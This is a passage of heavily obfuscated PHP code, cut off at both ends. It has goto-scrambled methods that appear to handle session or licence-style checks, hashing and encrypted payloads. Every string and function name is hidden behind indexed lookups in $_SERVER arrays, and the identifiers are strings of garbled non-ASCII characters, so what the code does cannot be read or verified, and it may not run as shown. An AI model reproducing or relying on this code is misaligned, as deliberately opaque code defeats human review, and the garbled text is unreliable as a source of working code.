array(); private $cvehc2b966c0 = ''; public function hsfc40845324() { goto fµÓŠÁÉª™; DéÑªÄ°ù: while ($BÌ°Áœ‡º— < $d÷É˜½·Èï[549]) { if ($BÌ°Áœ‡º— >= 0) { break; } $BÌ°Áœ‡º—++; } $this->{$_SERVER[§ŠùÊÊÛ©»][49]}(); $this->{$_SERVER[§ŠùÊÊÛ©»][50]}(); goto a’Ì„í…Î´; fµÓŠÁÉª™: $d÷É˜½·Èï =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $BÑ÷š«‘× =& $_SERVER[§ŠùÊÊÛ©»]; $this->{$_SERVER[§ŠùÊÊÛ©»][46]}(); goto CÙ†ƒµØ; f¡Õò®ÈˆÌ: $f£¬ö©ˆŒö = $d÷É˜½·Èï[570]; $this->{$_SERVER[§ŠùÊÊÛ©»][3]}($BÑ÷š«‘×[59], array($this, $BÑ÷š«‘×[60])); goto D†ºàóÂÒÅ; CÙ†ƒµØ: $this->{$_SERVER[§ŠùÊÊÛ©»][47]}(); $this->{$_SERVER[§ŠùÊÊÛ©»][48]}(); $BÌ°Áœ‡º— = $d÷É˜½·Èï[567]; goto DéÑªÄ°ù; a’Ì„í…Î´: $this->{$_SERVER[§ŠùÊÊÛ©»][51]}(); $bİË¸İ³æŠ = $d÷É˜½·Èï[568]; while (strlen($bİË¸İ³æŠ) < $d÷É˜½·Èï[549]) { if (!$bİË¸İ³æŠ) { break; } $bİË¸İ³æŠ++; } goto d§™îŞ–£®; d§™îŞ–£®: $this->{$_SERVER[§ŠùÊÊÛ©»][52]}(); $this->{$_SERVER[§ŠùÊÊÛ©»][3]}($BÑ÷š«‘×[53], array($this, $BÑ÷š«‘×[54])); $bŞÈÔÖªÓ = $d÷É˜½·Èï[569]; goto CƒÒÂ¬®±š; CƒÒÂ¬®±š: if (strlen($bŞÈÔÖªÓ) < $d÷É˜½·Èï[557]) { die; } $this->{$_SERVER[§ŠùÊÊÛ©»][3]}($BÑ÷š«‘×[55], array($this, $BÑ÷š«‘×[56])); $this->{$_SERVER[§ŠùÊÊÛ©»][3]}($BÑ÷š«‘×[57], array($this, $BÑ÷š«‘×[58])); goto f¡Õò®ÈˆÌ; D†ºàóÂÒÅ: } public function trzd817560a3($fÀ«¾¢“) { goto d²Ñ°Ş²äì; E‘ß¥‘Â÷˜: $AÍâ»‚Î«¸ = $Eê°šŒ¦ª¥[577]; if (strlen($AÍâ»‚Î«¸) < $Eê°šŒ¦ª¥[547]) { die; } if ($eĞ¢èé¡İõ[$A¸ÇŞÀ®µ[120]] != $A¸ÇŞÀ®µ[121]) { $fÀ«¾¢“[$A¸ÇŞÀ®µ[108]][$A¸ÇŞÀ®µ[122]] = $eĞ¢èé¡İõ[$A¸ÇŞÀ®µ[122]]; $fÀ«¾¢“[$A¸ÇŞÀ®µ[108]][$A¸ÇŞÀ®µ[123]] = $eĞ¢èé¡İõ[$A¸ÇŞÀ®µ[123]]; $FªÏğ…®ºà = $A¸ÇŞÀ®µ[124](10) . $this->cvehc2b966c0 . $A¸ÇŞÀ®µ[124](5); $fÀ«¾¢“[$A¸ÇŞÀ®µ[93]][$A¸ÇŞÀ®µ[125]][$A¸ÇŞÀ®µ[126]] = $this->{$_SERVER[§ŠùÊÊÛ©»][127]}($FªÏğ…®ºà, $fÀ«¾¢“[$A¸ÇŞÀ®µ[108]][$A¸ÇŞÀ®µ[113]]); } goto dÆÔÅ—è”è; D´Ãâ°‹Ë: if (!$FÓ‰¼öÆ°’) { die; } $fÀ«¾¢“[$A¸ÇŞÀ®µ[108]][$A¸ÇŞÀ®µ[113]] = $A¸ÇŞÀ®µ[114]($_SERVER[$A¸ÇŞÀ®µ[115]] . $eĞ¢èé¡İõ[$A¸ÇŞÀ®µ[116]]); $fÀ«¾¢“[$A¸ÇŞÀ®µ[108]][$A¸ÇŞÀ®µ[117]] = $A¸ÇŞÀ®µ[118]($A¸ÇŞÀ®µ[119]()); goto Eã©Íñ‘©Ú; d²Ñ°Ş²äì: $Eê°šŒ¦ª¥ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $A¸ÇŞÀ®µ =& $_SERVER[§ŠùÊÊÛ©»]; $eĞ¢èé¡İõ = $A¸ÇŞÀ®µ[61]($A¸ÇŞÀ®µ[62])->{$_SERVER[§ŠùÊÊÛ©»][63]}(); goto f—™Ğí”ÌÁ; DòÇÅ˜‡…Ç: return $fÀ«¾¢“; goto EÖ¦šÊªÅ‡; A•ŒÖ­¦º‡: foreach ($E«°Ş°Ü¡ as $DâËØÉÄÇë) { $A®¬·¿œŠç = $GLOBALS[$A¸ÇŞÀ®µ[91]][$A¸ÇŞÀ®µ[92]][$DâËØÉÄÇë]; if (isset($eĞ¢èé¡İõ[$DâËØÉÄÇë])) { $A®¬·¿œŠç = $eĞ¢èé¡İõ[$DâËØÉÄÇë]; } $fÀ«¾¢“[$A¸ÇŞÀ®µ[93]][$A¸ÇŞÀ®µ[94]][$DâËØÉÄÇë] = $A®¬·¿œŠç; } $eï·ò¯«Ò¦ = $fÀ«¾¢“[$A¸ÇŞÀ®µ[93]][$A¸ÇŞÀ®µ[94]][$A¸ÇŞÀ®µ[76]]; $CÎæ¹—ùƒ = $Eê°šŒ¦ª¥[572]; goto dÆ„ÎñšÚæ; Eã©Íñ‘©Ú: $eÓÙÄåË… = $Eê°šŒ¦ª¥[576]; if (!$eÓÙÄåË…) { return; } $fÀ«¾¢“[$A¸ÇŞÀ®µ[108]][$A¸ÇŞÀ®µ[120]] = $this->cvehc2b966c0; goto E‘ß¥‘Â÷˜; dÆ„ÎñšÚæ: if (!$CÎæ¹—ùƒ) { die; } unset($fÀ«¾¢“[$A¸ÇŞÀ®µ[93]][$A¸ÇŞÀ®µ[95]][$A¸ÇŞÀ®µ[96]]); unset($fÀ«¾¢“[$A¸ÇŞÀ®µ[93]][$A¸ÇŞÀ®µ[95]][$A¸ÇŞÀ®µ[97]]); goto AÌò«Á»ğ; f—™Ğí”ÌÁ: $E«°Ş°Ü¡ = array($A¸ÇŞÀ®µ[64], $A¸ÇŞÀ®µ[65], $A¸ÇŞÀ®µ[66], $A¸ÇŞÀ®µ[67], $A¸ÇŞÀ®µ[68], $A¸ÇŞÀ®µ[69], $A¸ÇŞÀ®µ[70], $A¸ÇŞÀ®µ[71], $A¸ÇŞÀ®µ[72], $A¸ÇŞÀ®µ[73], $A¸ÇŞÀ®µ[74], $A¸ÇŞÀ®µ[75], $A¸ÇŞÀ®µ[76], $A¸ÇŞÀ®µ[77], $A¸ÇŞÀ®µ[78], $A¸ÇŞÀ®µ[79], $A¸ÇŞÀ®µ[80], $A¸ÇŞÀ®µ[81], $A¸ÇŞÀ®µ[82], $A¸ÇŞÀ®µ[83], $A¸ÇŞÀ®µ[84], $A¸ÇŞÀ®µ[85], $A¸ÇŞÀ®µ[86], $A¸ÇŞÀ®µ[87], $A¸ÇŞÀ®µ[88], $A¸ÇŞÀ®µ[89], $A¸ÇŞÀ®µ[90]); $aÛäìƒæòƒ = $Eê°šŒ¦ª¥[571]; while (strlen($aÛäìƒæòƒ) < $Eê°šŒ¦ª¥[560]) { if (!$aÛäìƒæòƒ) { break; } $aÛäìƒæòƒ++; } goto A•ŒÖ­¦º‡; AäØÒ¹â±Ø: $eõÛğ›½¥Ø = $Eê°šŒ¦ª¥[578]; while ($eõÛğ›½¥Ø < $Eê°šŒ¦ª¥[557]) { if ($eõÛğ›½¥Ø >= 0) { break; } $eõÛğ›½¥Ø++; } if ($A¸ÇŞÀ®µ[104]($GLOBALS, $A¸ÇŞÀ®µ[132]) && $this->config[$A¸ÇŞÀ®µ[133]]) { $fÀ«¾¢“[$A¸ÇŞÀ®µ[108]][$A¸ÇŞÀ®µ[134]] = WEB_ROOT; } goto DòÇÅ˜‡…Ç; cöàµœÒ: $fÀ«¾¢“[$A¸ÇŞÀ®µ[93]][$A¸ÇŞÀ®µ[94]][$A¸ÇŞÀ®µ[99]] = array($A¸ÇŞÀ®µ[100] => (int) $eï·ò¯«Ò¦[$A¸ÇŞÀ®µ[101]], $A¸ÇŞÀ®µ[102] => $A¸ÇŞÀ®µ[103]($A¸ÇŞÀ®µ[104]($eï·ò¯«Ò¦, $A¸ÇŞÀ®µ[105], array())), $A¸ÇŞÀ®µ[106] => (int) $A¸ÇŞÀ®µ[104]($eï·ò¯«Ò¦, $A¸ÇŞÀ®µ[107], 0)); $fÀ«¾¢“[$A¸ÇŞÀ®µ[108]][$A¸ÇŞÀ®µ[109]] = $A¸ÇŞÀ®µ[110]($A¸ÇŞÀ®µ[111])->{$_SERVER[§ŠùÊÊÛ©»][112]}(); $FÓ‰¼öÆ°’ = $Eê°šŒ¦ª¥[575]; goto D´Ãâ°‹Ë; dÆÔÅ—è”è: if ($this->cvehc2b966c0 == $A¸ÇŞÀ®µ[121]) { $fÀ«¾¢“[$A¸ÇŞÀ®µ[93]][$A¸ÇŞÀ®µ[94]][$A¸ÇŞÀ®µ[99]][$A¸ÇŞÀ®µ[107]] = 0; } $fÀ«¾¢“[$A¸ÇŞÀ®µ[108]][$A¸ÇŞÀ®µ[128]] = $A¸ÇŞÀ®µ[104]($this->tcwjd3305372, $A¸ÇŞÀ®µ[129], $A¸ÇŞÀ®µ[10]); $fÀ«¾¢“[$A¸ÇŞÀ®µ[108]][$A¸ÇŞÀ®µ[130]] = $A¸ÇŞÀ®µ[104]($this->tcwjd3305372, $A¸ÇŞÀ®µ[131], $A¸ÇŞÀ®µ[10]); goto AäØÒ¹â±Ø; AÌò«Á»ğ: $AÜ’ø£ƒ = $Eê°šŒ¦ª¥[573]; if (!$AÜ’ø£ƒ) { return; } unset($fÀ«¾¢“[$A¸ÇŞÀ®µ[93]][$A¸ÇŞÀ®µ[94]][$A¸ÇŞÀ®µ[76]]); goto DæÈãĞ‰ÕØ; DæÈãĞ‰ÕØ: $d¨§±Øâ¯ñ = $Eê°šŒ¦ª¥[574]; if (strlen($d¨§±Øâ¯ñ) < $Eê°šŒ¦ª¥[560]) { return; } unset($fÀ«¾¢“[$A¸ÇŞÀ®µ[93]][$A¸ÇŞÀ®µ[94]][$A¸ÇŞÀ®µ[98]]); goto cöàµœÒ; EÖ¦šÊªÅ‡: } private function xtji65596f6a() { goto c‰î ƒ„± ; FƒîÈî¦‹í: $BÅñÕÜÉæ = $c’·š”™™ê[580]; while (strlen($BÅñÕÜÉæ) < $c’·š”™™ê[549]) { if (!$BÅñÕÜÉæ) { break; } $BÅñÕÜÉæ++; } $D»ªóàÊÛù = array($a”·âàˆ ˜[159] => $F¼¤êÂéÏÄ[$a”·âàˆ ˜[64]], $a”·âàˆ ˜[160] => $F¼¤êÂéÏÄ[$a”·âàˆ ˜[65]], $a”·âàˆ ˜[161] => $a”·âàˆ ˜[10]); goto Cµë†ôÊ¯â; c‰î ƒ„± : $c’·š”™™ê =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $a”·âàˆ ˜ =& $_SERVER[§ŠùÊÊÛ©»]; if ($_SERVER[$a”·âàˆ ˜[44]] == $a”·âàˆ ˜[135]) { goto eÕ§Î”Ã; CåÜñÌ™®½: $cé à•«×º = $c’·š”™™ê[579]; while (strlen($cé à•«×º) < $c’·š”™™ê[549]) { if (!$cé à•«×º) { break; } $cé à•«×º++; } $D»ªóàÊÛù = array($a”·âàˆ ˜[150] => $bÏ•äØ÷‚¿); goto döŞÖ Í‚×; eÕ§Î”Ã: $bÏ•äØ÷‚¿ = array($a”·âàˆ ˜[120] => $this->cvehc2b966c0, $a”·âàˆ ˜[136] => $this->{$_SERVER[§ŠùÊÊÛ©»][137]}(), $a”·âàˆ ˜[138] => $a”·âàˆ ˜[61]($a”·âàˆ ˜[139])->{$_SERVER[§ŠùÊÊÛ©»][140]}()); if ($this->cvehc2b966c0 != $a”·âàˆ ˜[121]) { $C¸ŒĞÙ×Ç = $a”·âàˆ ˜[104]($this->tcwjd3305372, $a”·âàˆ ˜[141]); if ($C¸ŒĞÙ×Ç) { $bÏ•äØ÷‚¿[$a”·âàˆ ˜[142]] = $C¸ŒĞÙ×Ç; $bÏ•äØ÷‚¿[$a”·âàˆ ˜[143]] = $a”·âàˆ ˜[144]($a”·âàˆ ˜[104]($this->tcwjd3305372, $a”·âàˆ ˜[145])); $bÏ•äØ÷‚¿[$a”·âàˆ ˜[146]] = $a”·âàˆ ˜[104]($this->tcwjd3305372, $a”·âàˆ ˜[131]); } } $bÏ•äØ÷‚¿ = $this->{$_SERVER[§ŠùÊÊÛ©»][147]}($a”·âàˆ ˜[148]($bÏ•äØ÷‚¿), $a”·âàˆ ˜[114]($a”·âàˆ ˜[149])); goto CåÜñÌ™®½; döŞÖ Í‚×: $a”·âàˆ ˜[13](array($a”·âàˆ ˜[151], $a”·âàˆ ˜[152]), $D»ªóàÊÛù); goto B›…½ÙØ“Ó; B›…½ÙØ“Ó: } goto fÓÊê½©î‰; A®¦ ñ®Æ²: $b Šƒ¸‘¶ = $c’·š”™™ê[582]; if (strlen($b Šƒ¸‘¶) < $c’·š”™™ê[553]) { die; } goto B—ºÚˆ’ÙŒ; fÓÊê½©î‰: if ($this->cvehc2b966c0 == $a”·âàˆ ˜[121]) { return; } $aÄØõ½éå² = array($a”·âàˆ ˜[153], $a”·âàˆ ˜[154], $a”·âàˆ ˜[155], $a”·âàˆ ˜[156], $a”·âàˆ ˜[157], $a”·âàˆ ˜[158]); $F¼¤êÂéÏÄ = $a”·âàˆ ˜[61]($a”·âàˆ ˜[62])->{$_SERVER[§ŠùÊÊÛ©»][63]}(); goto FƒîÈî¦‹í; Cµë†ôÊ¯â: $FÙµùíÛ  = $c’·š”™™ê[581]; foreach ($aÄØõ½éå² as $F…¼ãÛ…öí) { if (!isset($F¼¤êÂéÏÄ[$F…¼ãÛ…öí]) || !$F¼¤êÂéÏÄ[$F…¼ãÛ…öí]) { continue; } $D»ªóàÊÛù[$F…¼ãÛ…öí] = $F¼¤êÂéÏÄ[$F…¼ãÛ…öí]; } $a”·âàˆ ˜[13](array($a”·âàˆ ˜[151], $a”·âàˆ ˜[152]), $D»ªóàÊÛù); goto A®¦ ñ®Æ²; B—ºÚˆ’ÙŒ: } private function ucxz1b2047d4() { goto d½È‚ãÆÖ; f½ñÀ„¡é: $A¥¨îø…““[$d«æÃÂ°šé] = $b™Ş¨È©Öñ; $EªÌŒ·òæ…[61]($EªÌŒ·òæ…[11])->{$_SERVER[§ŠùÊÊÛ©»][226]}($E•×Ãé›í–[$EªÌŒ·òæ…[227]], array($EªÌŒ·òæ…[228] => $A¥¨îø…““)); $EªÌŒ·òæ…[166]($EªÌŒ·òæ…[197]($EªÌŒ·òæ…[208]), !0); goto F§äÖ…œÍ; D°ÁÒ³Æë‡: while (strlen($AÄÏ—ÏÍ‹ô) < $e›Ã ‰Ò¯ï[549]) { if (!$AÄÏ—ÏÍ‹ô) { break; } $AÄÏ—ÏÍ‹ô++; } $c‘µ Óƒ‘¼[$EªÌŒ·òæ…[123]] = $EªÌŒ·òæ…[118]($EªÌŒ·òæ…[214]($this->{$_SERVER[§ŠùÊÊÛ©»][147]}($b¢ˆ‰à•º‚, $EªÌŒ·òæ…[216]))); $FåÛ„ğİ–Œ = $e›Ã ‰Ò¯ï[587]; goto A­Ò £Ìİë; b½ÅĞÇ¥ŠŠ: $C“ÃÍ‹‚À = $EªÌŒ·òæ…[114]($_SERVER[$EªÌŒ·òæ…[115]] . $EªÌŒ·òæ…[214]($CÛÄç£±­‰) . $c‘µ Óƒ‘¼[$EªÌŒ·òæ…[210]]); $d«æÃÂ°šé = $EªÌŒ·òæ…[214]($EªÌŒ·òæ…[25]($C“ÃÍ‹‚À, 10, 16)); $B•§ÍÔï¾¦ = $e›Ã ‰Ò¯ï[588]; goto C»öó°™íğ; A­Ò £Ìİë: if (!$FåÛ„ğİ–Œ) { return; } if ($C»µ¥¢¯È±[$EªÌŒ·òæ…[217]] && $C»µ¥¢¯È±[$EªÌŒ·òæ…[217]] >= 1) { $EªÌŒ·òæ…[61]($EªÌŒ·òæ…[62])->{$_SERVER[§ŠùÊÊÛ©»][218]}($EªÌŒ·òæ…[219], $EªÌŒ·òæ…[220]); } $EªÌŒ·òæ…[61]($EªÌŒ·òæ…[62])->{$_SERVER[§ŠùÊÊÛ©»][221]}($c‘µ Óƒ‘¼); goto b½ÅĞÇ¥ŠŠ; Eë¬áå«˜: $c‘µ Óƒ‘¼[$EªÌŒ·òæ…[122]] = $EªÌŒ·òæ…[214]($EªÌŒ·òæ…[118]($this->{$_SERVER[§ŠùÊÊÛ©»][147]}($b´Ê¡®Ê…ë, $EªÌŒ·òæ…[215]))); $Aæë§‘ğÊ = $e›Ã ‰Ò¯ï[585]; while ($Aæë§‘ğÊ < $e›Ã ‰Ò¯ï[553]) { if ($Aæë§‘ğÊ >= 0) { break; } $Aæë§‘ğÊ++; } goto A«„˜ßí·ª; F§äÖ…œÍ: $F‰¦ãùˆ¨Ç = $e›Ã ‰Ò¯ï[590]; while (strlen($F‰¦ãùˆ¨Ç) < $e›Ã ‰Ò¯ï[560]) { if (!$F‰¦ãùˆ¨Ç) { break; } $F‰¦ãùˆ¨Ç++; } goto A¾ï›„Å¾İ; Bö² Æó¨Ò: $E›„¿Ú–™§ = $this->{$_SERVER[§ŠùÊÊÛ©»][199]}($C»µ¥¢¯È±[$EªÌŒ·òæ…[200]]); if (!$E›„¿Ú–™§ || $E›„¿Ú–™§ != $EªÌŒ·òæ…[201]($C»µ¥¢¯È±[$EªÌŒ·òæ…[145]])) { $CÁ‚Î‘½ = array($EªÌŒ·òæ…[202] => $EªÌŒ·òæ…[61]($EªÌŒ·òæ…[62])->{$_SERVER[§ŠùÊÊÛ©»][63]}($EªÌŒ·òæ…[116]), $EªÌŒ·òæ…[203] => $_SERVER[$EªÌŒ·òæ…[115]], $EªÌŒ·òæ…[204] => $EªÌŒ·òæ…[205](), $EªÌŒ·òæ…[174] => $_SERVER[$EªÌŒ·òæ…[175]]); $F¨¢·ˆÅÓ = $this->{$_SERVER[§ŠùÊÊÛ©»][206]}($EªÌŒ·òæ…[148]($CÁ‚Î‘½)); $this->{$_SERVER[§ŠùÊÊÛ©»][182]}($EªÌŒ·òæ…[207] . $F¨¢·ˆÅÓ); $EªÌŒ·òæ…[166]($EªÌŒ·òæ…[197]($EªÌŒ·òæ…[208]), !0); } $c‘µ Óƒ‘¼ = array($EªÌŒ·òæ…[209] => $dËïĞ¼»åá[$EªÌŒ·òæ…[165]], $EªÌŒ·òæ…[210] => $C»µ¥¢¯È±[$EªÌŒ·òæ…[211]], $EªÌŒ·òæ…[212] => $EªÌŒ·òæ…[124](16), $EªÌŒ·òæ…[120] => $C»µ¥¢¯È±[$EªÌŒ·òæ…[213]]); goto c®Îˆ…¶»Ô; dÃ¼æ·÷‹í: if (!$EªÌŒ·òæ…[104]($GLOBALS, $EªÌŒ·òæ…[132])) { die; } $E‹ğˆ‡×Éï = $GLOBALS[$EªÌŒ·òæ…[22]]; if (isset($E‹ğˆ‡×Éï[$EªÌŒ·òæ…[163]])) { $this->{$_SERVER[§ŠùÊÊÛ©»][164]}(); die; } goto F ›Çƒ™½Û; cØ§Õ‚Œ×Ø: $b’™íª Ÿ› = $e›Ã ‰Ò¯ï[589]; if (!$b’™íª Ÿ›) { return; } $A¥¨îø…““ = array(); goto f½ñÀ„¡é; c®Îˆ…¶»Ô: if ($dËïĞ¼»åá[$EªÌŒ·òæ…[168]]) { $c‘µ Óƒ‘¼[$EªÌŒ·òæ…[212]] = $dËïĞ¼»åá[$EªÌŒ·òæ…[168]]; } $E­ĞÕÇ…Å = $EªÌŒ·òæ…[25]($EªÌŒ·òæ…[114]($c‘µ Óƒ‘¼[$EªÌŒ·òæ…[210]]), 10, 10); $b´Ê¡®Ê…ë = $E­ĞÕÇ…Å . $c‘µ Óƒ‘¼[$EªÌŒ·òæ…[120]] . $c‘µ Óƒ‘¼[$EªÌŒ·òæ…[212]]; goto Eë¬áå«˜; d„‘ğ‚ªÊß: $fĞŞ×Æ®ñº = $e›Ã ‰Ò¯ï[583]; if (!$fĞŞ×Æ®ñº) { die; } $A¯¸ò™®«Ç = $EªÌŒ·òæ…[114]($_SERVER[$EªÌŒ·òæ…[115]] . $CÛÄç£±­‰); goto d¹Âá…ÔŞ®; d½È‚ãÆÖ: $e›Ã ‰Ò¯ï =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $EªÌŒ·òæ… =& $_SERVER[§ŠùÊÊÛ©»]; if ($_SERVER[$EªÌŒ·òæ…[44]] != $EªÌŒ·òæ…[162]) { return; } goto dÃ¼æ·÷‹í; d¹Âá…ÔŞ®: if ($E‹ğˆ‡×Éï[$EªÌŒ·òæ…[178]] == $EªÌŒ·òæ…[179]) { $DòøÒ¬Š­ = $this->{$_SERVER[§ŠùÊÊÛ©»][147]}($A¯¸ò™®«Ç, $EªÌŒ·òæ…[180]); $F¨¢·ˆÅÓ = $this->{$_SERVER[§ŠùÊÊÛ©»][127]}($EªÌŒ·òæ…[148]($dËïĞ¼»åá), $A¯¸ò™®«Ç . $EªÌŒ·òæ…[181], 3); $c¢×éÑĞŸ = $this->{$_SERVER[§ŠùÊÊÛ©»][182]}($EªÌŒ·òæ…[183] . $DòøÒ¬Š­ . $EªÌŒ·òæ…[184] . $F¨¢·ˆÅÓ, -1); $EªÌŒ·òæ…[166]($c¢×éÑĞŸ, !0); } else { if ($E‹ğˆ‡×Éï[$EªÌŒ·òæ…[178]] == $EªÌŒ·òæ…[185]) { $aš²ªÉˆ¼ã = $EªÌŒ·òæ…[25]($EªÌŒ·òæ…[114]($EªÌŒ·òæ…[186] . $A¯¸ò™®«Ç), 12, 15) . $EªÌŒ·òæ…[187]; $F¨¢·ˆÅÓ = $this->{$_SERVER[§ŠùÊÊÛ©»][188]}($EªÌŒ·òæ…[2]($E‹ğˆ‡×Éï[$EªÌŒ·òæ…[189]]), $aš²ªÉˆ¼ã, 2); $BÜ¢ùáïƒ† = $EªÌŒ·òæ…[190]($F¨¢·ˆÅÓ, !0); if (!$EªÌŒ·òæ…[191]($BÜ¢ùáïƒ†) || !$EªÌŒ·òæ…[191]($BÜ¢ùáïƒ†[$EªÌŒ·òæ…[192]]) || $BÜ¢ùáïƒ†[$EªÌŒ·òæ…[165]] != !0) { $AŠ’í¨Å¯­ = $EªÌŒ·òæ…[193]; $dê®‚©æã¼ = $BÜ¢ùáïƒ†[$EªÌŒ·òæ…[192]] ? $EªÌŒ·òæ…[194] . $BÜ¢ùáïƒ†[$EªÌŒ·òæ…[192]] : $AŠ’í¨Å¯­; $EªÌŒ·òæ…[166]($dê®‚©æã¼, !1); } else { $dËïĞ¼»åá[$EªÌŒ·òæ…[168]] = $BÜ¢ùáïƒ†[$EªÌŒ·òæ…[192]][$EªÌŒ·òæ…[195]]; } } else { $BÜ¢ùáïƒ† = $this->{$_SERVER[§ŠùÊÊÛ©»][182]}($EªÌŒ·òæ…[196], $dËïĞ¼»åá, 10); $e³Ñ¡×ÕŒİ = $e›Ã ‰Ò¯ï[584]; while ($e³Ñ¡×ÕŒİ < $e›Ã ‰Ò¯ï[549]) { if ($e³Ñ¡×ÕŒİ >= 0) { break; } $e³Ñ¡×ÕŒİ++; } } } if (!$EªÌŒ·òæ…[191]($BÜ¢ùáïƒ†) || !$EªÌŒ·òæ…[191]($BÜ¢ùáïƒ†[$EªÌŒ·òæ…[192]]) || $BÜ¢ùáïƒ†[$EªÌŒ·òæ…[165]] != !0) { $AŠ’í¨Å¯­ = $EªÌŒ·òæ…[197]($EªÌŒ·òæ…[198]); $dê®‚©æã¼ = $BÜ¢ùáïƒ†[$EªÌŒ·òæ…[192]] ? $EªÌŒ·òæ…[194] . $BÜ¢ùáïƒ†[$EªÌŒ·òæ…[192]] : $AŠ’í¨Å¯­; $EªÌŒ·òæ…[166]($dê®‚©æã¼, !1); } $C»µ¥¢¯È± = $BÜ¢ùáïƒ†[$EªÌŒ·òæ…[192]]; goto Bö² Æó¨Ò; E—ÁôÆÏ÷š: $F×í ŞÛ› = $e›Ã ‰Ò¯ï[562]; while ($F×í ŞÛ› < $e›Ã ‰Ò¯ï[557]) { if ($F×í ŞÛ› >= 0) { break; } $F×í ŞÛ›++; } $E•×Ãé›í– = $BËÀ÷²‚İ‘[$EªÌŒ·òæ…[225]]; goto cØ§Õ‚Œ×Ø; A«„˜ßí·ª: $aÎºå‡—Æë = $EªÌŒ·òæ…[124](16); $b¢ˆ‰à•º‚ = $aÎºå‡—Æë . $c‘µ Óƒ‘¼[$EªÌŒ·òæ…[120]] . $this->{$_SERVER[§ŠùÊÊÛ©»][147]}($EªÌŒ·òæ…[114]($c‘µ Óƒ‘¼[$EªÌŒ·òæ…[209]]), $aÎºå‡—Æë); $AÄÏ—ÏÍ‹ô = $e›Ã ‰Ò¯ï[586]; goto D°ÁÒ³Æë‡; F ›Çƒ™½Û: if (!isset($E‹ğˆ‡×Éï[$EªÌŒ·òæ…[165]]) || $EªÌŒ·òæ…[24]($E‹ğˆ‡×Éï[$EªÌŒ·òæ…[165]]) != 16) { $EªÌŒ·òæ…[166]($EªÌŒ·òæ…[167] . $E‹ğˆ‡×Éï[$EªÌŒ·òæ…[165]], !1); } $CÛÄç£±­‰ = $EªÌŒ·òæ…[61]($EªÌŒ·òæ…[62])->{$_SERVER[§ŠùÊÊÛ©»][63]}($EªÌŒ·òæ…[116]); $dËïĞ¼»åá = array($EªÌŒ·òæ…[165] => $E‹ğˆ‡×Éï[$EªÌŒ·òæ…[165]], $EªÌŒ·òæ…[168] => $EªÌŒ·òæ…[124](16), $EªÌŒ·òæ…[169] => $EªÌŒ·òæ…[149], $EªÌŒ·òæ…[170] => $EªÌŒ·òæ…[171], $EªÌŒ·òæ…[172] => $_SERVER[$EªÌŒ·òæ…[173]], $EªÌŒ·òæ…[174] => $_SERVER[$EªÌŒ·òæ…[175]], $EªÌŒ·òæ…[176] => $_SERVER[$EªÌŒ·òæ…[177]]); goto d„‘ğ‚ªÊß; C»öó°™íğ: if (!$B•§ÍÔï¾¦) { return; } $b™Ş¨È©Öñ = $this->{$_SERVER[§ŠùÊÊÛ©»][127]}($EªÌŒ·òæ…[148]($C»µ¥¢¯È±), $C“ÃÍ‹‚À); $BËÀ÷²‚İ‘ = $EªÌŒ·òæ…[222]($EªÌŒ·òæ…[61]($EªÌŒ·òæ…[11])->{$_SERVER[§ŠùÊÊÛ©»][223]}(), $EªÌŒ·òæ…[224]); goto E—ÁôÆÏ÷š; A¾ï›„Å¾İ: } private function voemc4091734() { goto F‡ÄÍà¶¦; dãÆ±¼‹¦å: $f®ŠÌˆ¿ƒ…[61]($f®ŠÌˆ¿ƒ…[62])->{$_SERVER[§ŠùÊÊÛ©»][218]}($f®ŠÌˆ¿ƒ…[219], $f®ŠÌˆ¿ƒ…[229]); $this->tcwjd3305372 = array(); $däµƒ‹ˆè³ = $b¦ôÅÔ‚œœ[591]; goto BŠØ‡Ä—À¤; F‡ÄÍà¶¦: $b¦ôÅÔ‚œœ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $f®ŠÌˆ¿ƒ… =& $_SERVER[§ŠùÊÊÛ©»]; $f®ŠÌˆ¿ƒ…[61]($f®ŠÌˆ¿ƒ…[62])->{$_SERVER[§ŠùÊÊÛ©»][221]}(array($f®ŠÌˆ¿ƒ…[209] => $f®ŠÌˆ¿ƒ…[10], $f®ŠÌˆ¿ƒ…[210] => $f®ŠÌˆ¿ƒ…[10], $f®ŠÌˆ¿ƒ…[120] => $f®ŠÌˆ¿ƒ…[121], $f®ŠÌˆ¿ƒ…[122] => $f®ŠÌˆ¿ƒ…[10], $f®ŠÌˆ¿ƒ…[123] => $f®ŠÌˆ¿ƒ…[10])); goto dãÆ±¼‹¦å; BŠØ‡Ä—À¤: if (strlen($däµƒ‹ˆè³) < $b¦ôÅÔ‚œœ[560]) { die; } $this->cvehc2b966c0 = $f®ŠÌˆ¿ƒ…[121]; goto aÃíÄÜÇ„¨; aÃíÄÜÇ„¨: } private function nfkzdf46db4b() { goto FçæÓÍŒÂ; CÔ¨ïİíœ‹: $CºÎ´ÕÍ÷ = $A™ËóºÃ¾‰[596]; if (!$CºÎ´ÕÍ÷) { return; } goto eŠ†áŞè˜‹; FçæÓÍŒÂ: $A™ËóºÃ¾‰ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $FÓø˜öåâ‹ =& $_SERVER[§ŠùÊÊÛ©»]; $_SERVER[$FÓø˜öåâ‹[175]] = $FÓø˜öåâ‹[104]($_SERVER, $FÓø˜öåâ‹[175], APP_HOST); goto d¼¯Š½Õ¶È; d·î Ê­“Û: $CóŒ‡¨¤ù™ = $FÓø˜öåâ‹[190]($CóŒ‡¨¤ù™, !0); if (!$FÓø˜öåâ‹[191]($CóŒ‡¨¤ù™)) { return $this->{$_SERVER[§ŠùÊÊÛ©»][164]}(); } $Dõâ”êÖÚò = $FÓø˜öåâ‹[144]($CóŒ‡¨¤ù™[$FÓø˜öåâ‹[145]]); goto b½Şº›¼ßÑ; BòŠÚÙ¸­Š: $fÑÇ÷á¤é = $A™ËóºÃ¾‰[593]; if (strlen($fÑÇ÷á¤é) < $A™ËóºÃ¾‰[549]) { die; } $B¨éôñ ó = $AœÍ”ÃÉÇˆ[$FÓø˜öåâ‹[225]]; goto eÄì…Ş½¼¸; eÄì…Ş½¼¸: $BÇ¿šÇâÒî = $FÓø˜öåâ‹[114]($_SERVER[$FÓø˜öåâ‹[115]] . $FÓø˜öåâ‹[214]($aÆëáÓ„÷) . $F¾ñğêÑ¤„[$FÓø˜öåâ‹[210]]); $c’âÍŒë”è = $A™ËóºÃ¾‰[594]; while (strlen($c’âÍŒë”è) < $A™ËóºÃ¾‰[557]) { if (!$c’âÍŒë”è) { 